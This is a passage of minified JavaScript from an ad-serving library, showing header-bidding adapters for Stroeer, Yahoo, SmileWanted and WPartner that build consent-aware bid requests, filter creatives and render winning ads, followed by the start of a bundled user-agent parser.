            if (!1 !== r || !1 !== n) return r && this.track.doError("Blocked Stroeer creative (" + i.crid + ") from " + r, "info"), this.chd.logs && this.chd.logs.blocked_creative && AdTrack.Utils.reportCreative(this.track.server, this.chd.logs.blocked_creative, this.chd.tag, i.crid || "", "", i.cpm, i.ad), void (t && t(null, null));
            if (i.ad.match("js.adscale.de/render.js")) return this.track.doError("Channel " + this.chd.tag + " responded with custom renderer. CRID(" + i.crid + ")"), void (t && t(null, null));
            if (!i.cpm) return this.track.doError("Channel " + this.chd.tag + " responded with empty currency."), void (t && t(null, null));
            this.price = AdTrack.Price.create(i.cpm, this.chd.currency), this.bidResponse.setPrice(this.price), this.bidResponse.setCreativeId(i.crid), i.width && i.height && (this.bidResponse.setWidth(i.width), this.bidResponse.setHeight(i.height)), t && t(this.price, this.response);
          } else t && t(null, null);
        }.bind(this),
        n = function (e, i) {
          i ? this.track.evBidTimeout(this.definition, this.chd) : this.track.evBidError(this.definition, this.chd), this.price = null, t && t(null, null);
        }.bind(this);
      AdTrack.Ajax.request({
        label: "Stroeer hb bid",
        url: "https://hb.adscale.de/dsh",
        method: "POST",
        async: !this.definition.options.noAsync,
        json: !0,
        timeout: this.chd.timeout || 800,
        data: JSON.stringify(i),
        ontimeout: function () {
          this.track.evBidTimeout(this.definition, this.chd, !0);
        }.bind(this),
        onerror: function () {
          this.track.evBidError(this.definition, this.chd, !0);
        }.bind(this)
      }, this.track.errorReporting).done(function (t) {
        r(t);
      }).fail(function (t, e) {
        n(t, e);
      }).send();
    },
    render: function (t, e, i) {
      e = e.normal;
      var r = this.track.getChannelKey(this.chd, e);
      if (r) {
        var n = function (t) {
          if (t && t.bids && t.bids[0] && t.bids[0].ad) {
            t.bids[0].width && t.bids[0].height && (this.chd.width = t.bids[0].width, this.chd.height = t.bids[0].height), this.adData = t.bids[0].ad;
            var e = {
                chd: this.chd,
                width: this.bidResponse.getDimension().width,
                height: this.bidResponse.getDimension().height,
                ad: {
                  data: t.bids[0].ad,
                  type: "content"
                }
              },
              r = new AdTrack.MediaTypes.Banner(e, this.track.errorReporting);
            i(r);
          } else this.track.passback(this.definition, this.chd);
        }.bind(this);
        this.price && this.response ? n(this.response) : this.bid(function (t, e) {
          n(e);
        }, r);
      } else this.track.doError("Undefined key");
    },
    createData: function (t) {
      var e = {
          id: AdTrack.Utils.randomString("AdTrackAuction"),
          bids: [],
          ref: AdTrack.Utils.getReferrer(),
          ssl: AdTrack.Utils.isSecure(AdTrack.url),
          mpa: !!AdTrack.Utils.windowTopAccess(),
          timeout: 500,
          url: AdTrack.url
        },
        i = this.track.getSupplyChain();
      if (i && (e.schain = i), AdTrack.UserID && !this.track.getOption("disableUserId")) {
        var r = AdTrack.UserID.getAllUserIds();
        r && !Array.isArray(r) && (e.user = {
          euids: r
        });
      }
      var n = null;
      return AdTrack.CMP && (n = AdTrack.CMP.getConsentData()), n && (this.track.evBidConsent(this.definition, this.chd, !0), e.gdpr = {
        consent: n.consentString,
        applies: !!n.gdprApplies
      }), e.bids.push({
        bid: AdTrack.Utils.randomString("AdTrack"),
        sid: t,
        siz: this.sizes,
        viz: !0
      }), e;
    }
  }, AdTrack.StroeerHbCSync = AdTrack.StroeerHbCSync || (i = !1, function () {
    if (!i) {
      var t = "https://js.adscale.de/pbsync.html",
        e = null;
      if (AdTrack.CMP && (e = AdTrack.CMP.getConsentData()), e) {
        var r = encodeURIComponent(e.consentString || "");
        t += "?gdpr=" + (e.gdprApplies ? 1 : 0) + "&gdpr_consent=" + r;
      }
      AdTrack.Utils.csyncFrame(t), i = !0;
    }
  });
}, function (t, e) {
  AdTrack.YahooHbChannel = function (t, e, i) {
    this.track = t, this.definition = e, this.chd = i, this.price = null, this.response = null, this.chd.sizes ? (this.sizes = this.chd.sizes, this.sizes.unshift([this.chd.width, this.chd.height])) : this.sizes = [[this.chd.width, this.chd.height]], this.bidResponse = new AdTrack.Bid(), this.MTsupport = !0, this.supportedUserIdsSources = ["admixer.net", "adserver.org", "adtelligent.com", "akamai.com", "amxrtb.com", "audigent.com", "britepool.com", "criteo.com", "crwdcntrl.net", "deepintent.com", "hcn.health", "id5-sync.com", "idx.lat", "intentiq.com", "intimatemerger.com", "liveintent.com", "liveramp.com", "mediawallahscript.com", "merkleinc.com", "netid.de", "neustar.biz", "nextroll.com", "novatiq.com", "parrable.com", "pubcid.org", "quantcast.com", "quantcast.com", "tapad.com", "uidapi.com", "verizonmedia.com", "yahoo.com", "zeotap.com"];
  }, AdTrack.YahooHbChannel.prototype = {
    report: function () {
      return this.adData || "";
    },
    bid: function (t, e) {
      var i = this.createData(e),
        r = this.__onSuccess.bind(this),
        n = this.__onError.bind(this);
      AdTrack.Ajax.request({
        label: "Yahoo hb bid",
        url: "https://c2shb.pubgw.yahoo.com/bidRequest",
        method: "POST",
        async: !this.definition.options.noAsync,
        json: !0,
        timeout: this.chd.timeout || 800,
        data: JSON.stringify(i),
        headers: {
          "Content-type": "application/json",
          "x-openrtb-version": "2.5"
        },
        ontimeout: function () {
          this.track.evBidTimeout(this.definition, this.chd, !0);
        }.bind(this),
        onerror: function () {
          this.track.evBidError(this.definition, this.chd, !0);
        }.bind(this)
      }, this.track.errorReporting).done(function (e) {
        r(e, t);
      }).fail(function (e, i) {
        n(e, i, t);
      }).send();
    },
    render: function (t, e, i) {
      e = e.normal;
      var r = this.track.getChannelKey(this.chd, e);
      if (r) {
        var n = function (t) {
          if (t && t.seatbid && t.seatbid[0] && t.seatbid[0].bid && t.seatbid[0].bid[0] && t.seatbid[0].bid[0].adm) {
            var e = t.seatbid[0].bid[0];
            e.w && e.h && (this.chd.width = e.w, this.chd.height = e.h), this.adData = e.adm;
            var r = {
                chd: this.chd,
                width: this.bidResponse.getDimension().width,
                height: this.bidResponse.getDimension().height,
                ad: {
                  data: e.adm,
                  type: "content"
                }
              },
              n = new AdTrack.MediaTypes.Banner(r, this.track.errorReporting);
            i(n);
          } else this.track.passback(this.definition, this.chd);
        }.bind(this);
        this.price && this.response ? n(this.response) : this.bid(function (t, e) {
          n(e);
        }, r);
      } else this.track.doError("Undefined key");
    },
    createData: function (t) {
      var e = !1,
        i = !1,
        r = null;
      AdTrack.CMP && (r = AdTrack.CMP.getConsentData()), r && (e = !0);
      var n = null;
      AdTrack.USP && (n = AdTrack.USP.getConsentData()), n && n.consentString && (i = !0), (e || i) && this.track.evBidConsent(this.definition, this.chd, e, i);
      var s = [];
      if (AdTrack.UserID && !this.track.getOption("disableUserId")) {
        var a = AdTrack.UserID.getAllUserIdsAsEids();
        a && Array.isArray(a) && a.forEach(function (t) {
          -1 !== this.supportedUserIdsSources.indexOf(t.source) && s.push(t);
        }.bind(this));
      }
      var o = t.split("-");
      2 !== o.length && this.track.doError("Wrong format for key, should be: [dcn]-[pos]");
      var d = AdTrack.Utils.uuid(),
        c = {
          id: d,
          cur: [this.chd.currency],
          imp: [],
          site: {
            page: AdTrack.Utils.getUrlWithoutSafeFrame(this.track),
            domain: AdTrack.Utils.getDomain(this.definition.info),
            ref: AdTrack.Utils.getReferrer(),
            id: o[0]
          },
          device: {
            dnt: 0,
            ua: navigator.userAgent,
            ip: this.track.settings.ip ? this.track.settings.ip : "",
            w: window.screen.width,
            h: window.screen.height
          },
          regs: {
            ext: {
              us_privacy: n && n.consentString ? n.consentString : "",
              gdpr: r && r.gdprApplies ? 1 : 0
            }
          },
          source: {
            ext: {
              hb: 1,
              adapterver: "1.0.2",
              prebidver: "7.19.0",
              integration: {
                name: "prebid.js",
                ver: "7.19.0"
              }
            },
            fd: 1
          },
          user: {
            ext: {
              consent: r && r.gdprApplies ? r.consentString : "",
              eids: s
            }
          }
        },
        h = this.track.getSupplyChain();
      h && h.nodes && Array.isArray(h.nodes) && h.nodes.length > 0 && (c.source.ext.schain = h, c.source.ext.schain.nodes[0].rid = d);
      var l = {
        id: AdTrack.Utils.uuid(),
        secure: AdTrack.Utils.isSecure(AdTrack.url) ? 1 : 0,
        bidfloor: this.chd.bidFloor,
        tagid: o[1],
        banner: {
          mimes: ["text/html", "text/javascript", "application/javascript", "image/jpg"],
          format: this.sizes.map(function (t) {
            return {
              w: t[0],
              h: t[1]
            };
          })
        },
        ext: {
          dfp_ad_unit_code: this.track.unitID.getName(),
          pos: o[1]
        }
      };
      return c.imp.push(l), c;
    },
    __onSuccess: function (t, e) {
      if (this.response = t, this.track.shouldCsync("yahoo-hb") && AdTrack.UserSync.addUserSync("yahoo-hb", 25, function () {
        this.__csync(this.response);
      }.bind(this), this.track.settings), t && t.seatbid && t.seatbid[0]) {
        if (!(t.seatbid[0] && t.seatbid[0].bid && t.seatbid[0].bid[0])) return this.track.doError("Channel " + this.chd.tag + " responded with unknown response."), void (e && e(null, null));
        var i = t.seatbid[0].bid[0],
          r = AdTrack.Utils.isBlackListedAds(i.adm),
          n = AdTrack.Utils.testAd(i.adm, this.definition.options.contentBlackList || []),
          s = i.ext && i.ext.encp ? i.ext.encp : i.price;
        if (!1 !== r || !1 !== n) return r && this.track.doError("Blocked Yahoo creative (" + i.crid + ") from " + r, "info"), this.chd.logs && this.chd.logs.blocked_creative && AdTrack.Utils.reportCreative(this.track.server, this.chd.logs.blocked_creative, this.chd.tag, i.crid || "", "", s, i.adm), void (e && e(null, null));
        if (!s) return this.track.doError("Channel " + this.chd.tag + " responded with empty price."), void (e && e(null, null));
        if (i.cur && i.cur !== this.chd.currency) return this.track.doError("Channel " + this.chd.tag + " responded with different currency."), void (e && e(null, null));
        this.price = AdTrack.Price.create(s, this.chd.currency), this.bidResponse.setPrice(this.price), this.bidResponse.setCreativeId(i.crid), i.w && i.h && (this.bidResponse.setWidth(i.w), this.bidResponse.setHeight(i.h)), e && e(this.price, this.response);
      } else e && e(null, null);
    },
    __onError: function (t, e, i) {
      e ? this.track.evBidTimeout(this.definition, this.chd) : this.track.evBidError(this.definition, this.chd), this.price = null, i && i(null, null);
    },
    __csync: function (t) {
      if (t && t.ext && t.ext.pixels) {
        var e = /\w*(?=\s)/,
          i = /src=("|')(.*?)\1/,
          r = t.ext.pixels.match(/(img|iframe)[\s\S]*?src\s*=\s*("|')(.*?)\2/gi);
        r && r.forEach(function (t) {
          var r = t.match(e)[0],
            n = t.match(i)[2];
          r && n && ("img" === r.toLowerCase() ? AdTrack.Utils.firePixel(n) : AdTrack.Utils.csyncFrame(n));
        });
      }
    }
  };
}, function (t, e) {
  var i;
  AdTrack.SmileWantedHbChannel = function (t, e, i) {
    this.track = t, this.definition = e, this.chd = i, this.price = null, this.response = null, this.chd.sizes ? (this.sizes = this.chd.sizes, this.sizes.unshift([this.chd.width, this.chd.height])) : this.sizes = [[this.chd.width, this.chd.height]], this.bidResponse = new AdTrack.Bid(), this.track.shouldCsync("smilewanted") && AdTrack.UserSync.addUserSync("smilewanted", 639, function () {
      AdTrack.SmileWantedCSync();
    }.bind(this), this.track.settings), this.MTsupport = !0;
  }, AdTrack.SmileWantedHbChannel.prototype = {
    report: function () {
      return this.adData || "";
    },
    bid: function (t, e) {
      var i = this.createData(e),
        r = this.__onSuccess.bind(this),
        n = this.__onError.bind(this);
      AdTrack.Ajax.request({
        label: "Smile wanted",
        url: "https://prebid.smilewanted.com",
        method: "POST",
        async: !this.definition.options.noAsync,
        json: !0,
        timeout: this.chd.timeout || 800,
        data: JSON.stringify(i),
        ontimeout: function () {
          this.track.evBidTimeout(this.definition, this.chd, !0);
        }.bind(this),
        onerror: function () {
          this.track.evBidError(this.definition, this.chd, !0);
        }.bind(this)
      }, this.track.errorReporting).done(function (e) {
        r(e, t);
      }).fail(function (e, i) {
        n(e, i, t);
      }).send();
    },
    render: function (t, e, i) {
      e = e.normal;
      var r = this.track.getChannelKey(this.chd, e);
      if (r) {
        var n = function (t) {
          if (t && t.ad) {
            t.width && t.height && (this.chd.width = t.width, this.chd.height = t.height), this.adData = t.ad;
            var e = {
                chd: this.chd,
                width: this.bidResponse.getDimension().width,
                height: this.bidResponse.getDimension().height,
                ad: {
                  data: t.ad,
                  type: "content"
                }
              },
              r = new AdTrack.MediaTypes.Banner(e, this.track.errorReporting);
            i(r);
          } else this.track.passback(this.definition, this.chd);
        }.bind(this);
        this.price && this.response ? n(this.response) : this.bid(function (t, e) {
          n(e);
        }, r);
      } else this.track.doError("Undefined key");
    },
    createData: function (t) {
      var e = {
        zoneId: t,
        currencyCode: this.chd.currency || AdTrack.Price.EUR,
        tagId: "r2b2Ad",
        sizes: this.sizes.map(function (t) {
          return {
            w: t[0],
            h: t[1]
          };
        }),
        transactionId: AdTrack.Utils.uuid(),
        timeout: 500,
        bidId: AdTrack.Utils.randomString("AdTrackAuction"),
        positionType: "",
        prebidVersion: "7.16.0"
      };
      this.chd.bidFloor && (e.bidfloor = this.chd.bidFloor), AdTrack.url && (e.pageDomain = AdTrack.url.split("?")[0].split("#")[0]);
      var i = null;
      return AdTrack.CMP && (i = AdTrack.CMP.getConsentData()), i && (this.track.evBidConsent(this.definition, this.chd, !0), e.gdpr_consent = i.consentString, e.gdpr = i.gdprApplies), e;
    },
    __onSuccess: function (t, e) {
      if (t) {
        this.response = t;
        var i = AdTrack.Utils.isBlackListedAds(t.ad),
          r = AdTrack.Utils.testAd(t.ad, this.definition.options.contentBlackList || []);
        if (!1 !== i || !1 !== r) return i && this.track.doError("Blocked Smile wanted creative (" + t.creativeId + ") from " + i, "info"), this.chd.logs && this.chd.logs.blocked_creative && AdTrack.Utils.reportCreative(this.track.server, this.chd.logs.blocked_creative, this.chd.tag, t.creativeId || "", "", t.cpm, t.ad), void (e && e(null, null));
        if (!t.currency) return this.track.doError("Channel " + this.chd.tag + " responded with empty currency."), void (e && e(null, null));
        if (t.currency !== this.chd.currency) return this.track.doError("Channel " + this.chd.tag + " responded with different currency than one in channel definition."), void (e && e(null, null));
        if (!t.cpm) return this.track.doError("Channel " + this.chd.tag + " responded with empty price."), void (e && e(null, null));
        this.price = AdTrack.Price.create(t.cpm, this.chd.currency), this.bidResponse.setPrice(this.price), this.bidResponse.setCreativeId(t.creativeId), t.width && t.height && (this.bidResponse.setWidth(t.width), this.bidResponse.setHeight(t.height)), e && e(this.price, this.response);
      } else e && e(null, null);
    },
    __onError: function (t, e, i) {
      e ? this.track.evBidTimeout(this.definition, this.chd) : this.track.evBidError(this.definition, this.chd), this.price = null, i && i(null, null);
    }
  }, AdTrack.SmileWantedCSync = AdTrack.SmileWantedCSync || (i = !1, function () {
    if (!i) {
      var t,
        e = "",
        r = null;
      if (AdTrack.CMP && (r = AdTrack.CMP.getConsentData()), r && r.consentString && (e = "?gdpr_consent=" + encodeURIComponent(r.consentString), void 0 !== r.gdprApplies && (e += "&gdpr=" + (r.gdprApplies ? 1 : 0))), AdTrack.USP && (t = AdTrack.USP.getConsentData()), t && t.consentString) {
        var n = encodeURIComponent(t.consentString),
          s = e.indexOf("?");
        e += -1 === s ? "?" : "&", e += n;
      }
      var a = "https://csync.smilewanted.com" + e;
      AdTrack.Utils.csyncFrame(a), i = !0;
    }
  });
}, function (t, e) {
  var i;
  AdTrack.WPartnerHbChannel = function (t, e, i) {
    this.track = t, this.definition = e, this.chd = i, this.price = null, this.response = null, this.style = null, this.bidResponse = new AdTrack.Bid(), this.MTsupport = !0, this.accountId = this.chd.accountId || AdTrack.Config.getAccountId("wpartner"), this.slot = "", this.siteObject = {}, this.pageview = {}, this.bidTimeout = this.chd.timeout || 800, this.track.shouldCsync("wpartner") && AdTrack.UserSync.addUserSync("wpartner", 676, function () {
      AdTrack.WPartnerCSync(this.pageview);
    }.bind(this), this.track.settings);
  }, AdTrack.WPartnerHbChannel.prototype = {
    report: function () {
      return this.adData || "";
    },
    bid: function (t, e) {
      if (AdTrack.UserSync.isVendorAllowed(676)) {
        var i = e.split("#");
        this.slot = i.length > 1 ? i[1] : i[0], this.siteObject = this.getSiteObj();
        var r = "https://ssp.wp.pl/bidder/?cs=" + AdTrack.Cookies.cookiesEnabled + "&bdver=5.8&pbver=7.43.0&inver=0",
          n = this.createData(this.slot),
          s = this;
        AdTrack.Ajax.request({
          label: "wpartner bid",
          url: r,
          method: "POST",
          data: JSON.stringify(n),
          json: !0,
          async: !this.definition.options.noAsync,
          headers: {},
          timeout: this.bidTimeout,
          ontimeout: function () {
            this.track.evBidTimeout(this.definition, this.chd, !0);
          }.bind(this),
          onerror: function () {
            this.track.evBidError(this.definition, this.chd, !0);
          }.bind(this),
          withCredentials: !0
        }, this.track.errorReporting).done(function (e) {
          if (e) {
            if (s.pageview.sn = e.sn || "mc_adapter", e.seatbid && e.seatbid[0] && e.seatbid[0].bid && e.seatbid[0].bid[0]) {
              var i = e.seatbid[0].bid[0];
              if (function (t) {
                const e = new RegExp(/^<\?xml/);
                return t.adm && t.adm.match(e);
              }(i) || function (t) {
                const e = new RegExp(/^{['"]native['"]/);
                return t.admNative || t.adm && t.adm.match(e);
              }(i)) return s.track.doError("[" + s.chd.tag + "] served different mediatype"), void (t && t(null, null));
              if (!i.ext || !i.ext.siteid) return s.track.doError("[" + s.chd.tag + "] missing siteid in response " + (i.ext ? "(no siteid)" : "(no ext)")), void (t && t(null, null));
              if (i.ext && i.ext.siteid && -1 !== i.ext.siteid.indexOf("bidid")) return s.track.doError("[" + s.chd.tag + "] site id includes bidid"), void (t && t(null, null));
              i.ext && !i.ext.slotid ? s.track.doError("[" + s.chd.tag + "] missing slotid in response") : s.slotid = i.ext.slotid, i.ext && i.ext.tagid && i.ext.tagid !== s.slot && s.track.doError("[" + s.chd.tag + "] tagid differs");
              var r = AdTrack.Utils.isBlackListedAds(i.adomain),
                n = AdTrack.Utils.testAd(i.adomain, s.definition.options.contentBlackList || []);
              !1 === r && !1 === n && (e.cur && e.cur !== s.chd.currency ? s.track.doError("Channel " + s.chd.tag + " responsed with wrong currency: " + e.cur) : (s.price = AdTrack.Price.create(i.price, AdTrack.Price.EUR, null), s.bidResponse.setPrice(s.price), s.bidResponse.setWidth(i.w ? i.w : s.chd.width), s.bidResponse.setHeight(i.h ? i.h : s.chd.height), s.bidResponse.setCreativeId(i.crid)));
            } else r && s.track.doError("Blocked WPartner creative from " + r, "info"), s.chd.logs && s.chd.logs.blocked_creative && AdTrack.Utils.reportCreative(s.track.server, s.chd.logs.blocked_creative, s.chd.tag, "", "", i.price, i.adm), t && t(null, null);
          } else s.price = null;
          s.response = e, t && t(s.price, e);
        }).fail(function (e, i) {
          i ? s.track.evBidTimeout(s.definition, s.chd) : s.track.evBidError(s.definition, s.chd), s.price = null, t && t(null, null);
        }).send();
      } else t(null, null);
    },
    render: function (t, e, i) {
      var r = this.track.getChannelKey(this.chd, e);
      if (r) {
        var n = function (t) {
          if (t && t.seatbid && t.seatbid[0] && t.seatbid[0].bid && t.seatbid[0].bid[0]) {
            var e = t.seatbid[0].seat,
              r = t.seatbid[0].bid[0];
            this.adData = t, this.chd.width = r.w ? r.w : this.chd.width, this.chd.height = r.h ? r.h : this.chd.height, this.siteObject.slot = this.slot, this.siteObject.sn = this.pageview.sn;
            var n = r.ext;
            n && (this.siteObject.id = n.siteid || this.siteObject.id, this.siteObject.slot = n.slotid, this.siteObject.publisherId = n.pubid, this.siteObject.adLabel = n.adlabel);
            var s = this.getNotificationPayload(r, e);
            s ? (s.event = "bidWon", this.sendNotification(s)) : this.track.doError("[" + this.chd.tag + "] No notification sent"), r.ext && r.ext.vurls && Array.isArray(r.ext.vurls) && r.ext.vurls.length > 0 && this.track.renderer.on("impress", function () {
              r.ext.vurls.forEach(function (t) {
                AdTrack.Utils.firePixel(t);
              });
            });
            var a = {
                chd: this.chd,
                width: this.bidResponse.getDimension().width,
                height: this.bidResponse.getDimension().height,
                ad: {
                  data: this.createFrameContent(this.siteObject, t.id, r, e),
                  type: "content"
                }
              },
              o = new AdTrack.MediaTypes.Banner(a, this.track.errorReporting);
            i(o);
          } else this.track.passback(this.definition, this.chd);
        }.bind(this);
        this.price && this.response ? n(this.response) : this.bid(function (t, e) {
          n(e);
        }, r);
      } else this.track.doError("Undefined key");
    },
    createData: function (t) {
      this.auctionId = AdTrack.Utils.uuid();
      for (var e = 1e15 + Math.round(1e15 * Math.random()), i = {
          id: this.auctionId,
          site: this.siteObject,
          imp: [],
          cur: ["EUR"],
          tmax: this.chd.timeout || 450,
          user: {},
          regs: {},
          device: {
            language: navigator.language || navigator.languages && navigator.languages[0],
            w: screen.width,
            h: screen.height
          },
          test: this.chd.test ? 1 : void 0
        }, r = [{
          w: this.chd.width,
          h: this.chd.height
        }], n = this.chd.sizes ? this.chd.sizes : [], s = 0; s < n.length; s++) 2 === n[s].length && r.push({
        w: n[s][0],
        h: n[s][1]
      });
      if (i.imp = [{
        id: "bidid-" + e,
        banner: {
          format: r,
          id: "" + e
        },
        bidfloor: 0,
        bidfloorcur: "EUR",
        tagid: t,
        ext: {
          data: {
            pbsize: this.chd.width + "x" + this.chd.height + "_1"
          }
        }
      }], this.applyHints(i), AdTrack.CMP) {
        var a = AdTrack.CMP.getConsentData();
        a && (this.track.evBidConsent(this.definition, this.chd, !0), i.regs.gdpr = a.gdprApplies ? 1 : 0, i.user.consent = a.consentString);
      }
      if (AdTrack.UserID && !this.track.getOption("disableUserId")) {
        var o = AdTrack.UserID.getAllUserIdsAsEids();
        o && o.length > 0 && (i.user.eids = o);
      }
      return i;
    },
    getSiteObj: function (t) {
      var e,
        i = AdTrack.Utils.windowTopAccess();
      return i && (e = i.document.body.parentNode.lang), {
        id: t || void 0,
        publisher: this.accountId ? {
          id: "" + this.accountId
        } : void 0,
        page: AdTrack.url,
        domain: AdTrack.Utils.getDomain(this.definition.info),
        ref: AdTrack.Utils.getDomainNameFromUrl(document.referrer, !0) || null,
        content: {
          language: e
        }
      };
    },
    applyHints: function (t) {
      const {
        location: e
      } = document;
      this.pageview.id && e.pathname === this.pageview.path || (this.pageview.path = e.pathname, this.pageview.id = "" + Math.floor(1e20 * Math.random()));
      const {
          connection: i = {},
          deviceMemory: r,
          userAgentData: n = {}
        } = navigator,
        s = window.visualViewport || !1,
        a = [],
        o = {
          "CH-Ect": i.effectiveType,
          "CH-Rtt": i.rtt,
          "CH-SaveData": i.saveData,
          "CH-Downlink": i.downlink,
          "CH-DeviceMemory": r,
          "CH-Dpr": window.devicePixelRatio,
          "CH-ViewportWidth": s.width,
          "CH-BrowserBrands": JSON.stringify(n.brands),
          "CH-isMobile": n.mobile
        };
      for (var d in o) o.hasOwnProperty(d) && o[d] && a.push({
        name: d,
        value: "" + o[d]
      });
      t.user.data = [{
        id: "12",
        name: "NetInfo",
        segment: a
      }, {
        id: "7",
        name: "pvid",
        segment: [{
          value: this.pageview.id
        }]
      }];
    },
    createFrameContent: function (t, e, i, r) {
      let n;
      const s = {
          id: e,
          seat: r,
          seatbid: [{
            bid: [i]
          }]
        },
        a = btoa(encodeURI(JSON.stringify(s)));
      try {
        (n = JSON.parse(i.adm).gam) && Object.keys(n).length ? (n.namedSizes = ["fluid"], n.div = "div-gpt-ad-x01", n.targeting = n.targeting || {}, n.targeting.OAS_retarg = "0", n.targeting.PREBID_ON = "1", n.targeting.emptygaf = "0") : n = void 0;
      } catch (t) {
        this.track.doError("[" + this.chd.tag + "] Could not parse adm data");
      }
      var o = {};
      if (AdTrack.CMP) {
        var d = AdTrack.CMP.getConsentData();
        d && (this.track.evBidConsent(this.definition, this.chd, !0), o.gdprApplies = d.gdprApplies ? 1 : 0, o.consentString = d.consentString);
      }
      var c = function () {
          AdTrack.adblock || this.track.doError("[" + this.chd.tag + "] Failed to load resource");
        }.bind(this),
        h = AdTrack.Utils.getHTMLWithErrorHandling("script", {
          src: "https://std.wpcdn.pl/wpjslib/wpjslib-inline.js",
          async: "",
          crossorigin: "",
          nomodule: "",
          id: "wpjslib"
        }, c),
        l = AdTrack.Utils.getHTMLWithErrorHandling("script", {
          src: "https://std.wpcdn.pl/wpjslib6/wpjslib-inline.js",
          async: "",
          crossorigin: "",
          type: "module",
          id: "wpjslib6"
        }, c);
      let u = '<head><title></title><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><style>body {background-color: transparent;margin: 0;padding: 0;}</style><script>window.rekid = ' + t.id + ";window.slot = " + parseInt(t.slot, 10) + ";window.responseTimestamp = " + Date.now() + ';window.wp_sn = "' + t.sn + '";window.mcad = JSON.parse(decodeURI(atob("' + a + '")));window.gdpr = ' + JSON.stringify(o) + ';window.page = "' + t.page + '";window.ref = "' + t.ref + '";window.adlabel = "' + (t.adLabel ? t.adLabel : "") + '";window.pubid = "' + (t.publisherId ? t.publisherId : "") + '";window.requestPVID = "' + this.pageview.id + '";';
      return u += '<\/script></head><body><div id="c"></div>' + h + l + "</body></html>";
    },
    sendNotification: function (t) {
      AdTrack.Ajax.request({
        url: "https://ssp.wp.pl/bidder/notify",
        method: "POST",
        data: JSON.stringify(t),
        async: !0
      }).send();
    },
    getNotificationPayload: function (t, e) {
      if (t) {
        var i = Array.isArray(t) ? t : [t];
        if (i.length > 0) {
          var r = {
            requestId: void 0,
            siteId: [],
            tagid: [],
            slotId: []
          };
          return i.forEach(t => {
            this.siteObject.id && r.siteId.push(this.siteObject.id), this.slotid && r.slotId.push(this.slotid), r.tagid.push(this.slot), r.requestId = this.response.id || r.requestId, r.timeout = t.timeout || r.timeout || this.bidTimeout, r.pvid = this.pageview.id, t.cpm && (r.cpm = t.cpm, r.cpmpl = t.ext && t.ext.pricepl, r.creativeId = t.crid || "mcad_" + this.auctionId + "_" + this.slot, r.adomain = t.adomain && t.adomain[0], r.networkName = e);
          }), r;
        }
      }
    }
  }, AdTrack.WPartnerCSync = AdTrack.WPartnerCSync || (i = !1, function (t) {
    if (!i) {
      var e = "https://ssp.wp.pl/bidder/usersync",
        r = AdTrack.CMP.getConsentData();
      e += "?pvid=" + t.id + "&sn=" + (t.sn || "mc_adapter"), r && (e += "&tcf=" + (r.tcfPolicyVersion ? r.tcfPolicyVersion : "")), AdTrack.Utils.csyncFrame(e), i = !0;
    }
  });
}, function (t, e, i) {
  const r = i(86);
  AdTrack.UAParser = AdTrack.UAParser || r;
}, function (t, e, i) {
  var r;
  !function (n, s) {
    "use strict";

    var a = "model",
      o = "name",
      d = "type",
      c = "vendor",
      h = "version",
      l = "mobile",
      u = "tablet",
      p = {
        extend: function (t, e) {
          var i = {};
          for (var r in t) e[r] && e[r].length % 2 == 0 ? i[r] = e[r].concat(t[r]) : i[r] = t[r];
          return i;
        },
        has: function (t, e) {
          return "string" == typeof t && -1 !== e.toLowerCase().indexOf(t.toLowerCase());
        },
        lowerize: function (t) {
          return t.toLowerCase();
        },
        major: function (t) {
          return "string" == typeof t ? t.replace(/[^\d\.]/g, "").split(".")[0] : void 0;
        },
        trim: function (t) {
          return t.replace(/^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g, "");
        }
      },
      f = {
        rgx: function (t, e) {
          for (var i, r, n, s, a, o, d = 0; d < e.length && !a;) {
            var c = e[d],
              h = e[d + 1];
            for (i = r = 0; i < c.length && !a;) if (a = c[i++].exec(t)) for (n = 0; n < h.length; n++) o = a[++r], "object" == typeof (s = h[n]) && s.length > 0 ? 2 == s.length ? "function" == typeof s[1] ? this[s[0]] = s[1].call(this, o) : this[s[0]] = s[1] : 3 == s.length ? "function" != typeof s[1] || s[1].exec && s[1].test ? this[s[0]] = o ? o.replace(s[1], s[2]) : void 0 : this[s[0]] = o ? s[1].call(this, o, s[2]) : void 0 : 4 == s.length && (this[s[0]] = o ? s[3].call(this, o.replace(s[1], s[2])) : void 0) : this[s] = o || void 0;
            d += 2;
          }
        },
        str: function (t, e) {
          for (var i in e) if ("object" == typeof e[i] && e[i].length > 0) {
            for (var r = 0; r < e[i].length; r++) if (p.has(e[i][r], t)) return "?" === i ? void 0 : i;
          } else if (p.has(e[i], t)) return "?" === i ? void 0 : i;
          return t;
        }
      },
      g = {
        browser: {
          oldsafari: {
            version: {
              "1.0": "/8",
              1.2: "/1",
              1.3: "/3",
              "2.0": "/412",
              "2.0.2": "/416",
              "2.0.3": "/417",
              "2.0.4": "/419",
              "?": "/"
            }
          }
        },
        device: {
          amazon: {
            model: {
              "Fire Phone": ["SD", "KF"]
            }
          },
          sprint: {
            model: {
              "Evo Shift 4G": "7373KT"
            },
            vendor: {
              HTC: "APA",
              Sprint: "Sprint"
            }
          }
        },
        os: {
          windows: {
            version: {
              ME: "4.90",
              "NT 3.11": "NT3.51",
              "NT 4.0": "NT4.0",
              2e3: "NT 5.0",
              XP: ["NT 5.1", "NT 5.2"],
              Vista: "NT 6.0",
              7: "NT 6.1",
              8: "NT 6.2",
              8.1: "NT 6.3",
              10: ["NT 6.4", "NT 10.0"],
              RT: "ARM"
            }
          }
        }
      },
      m = {
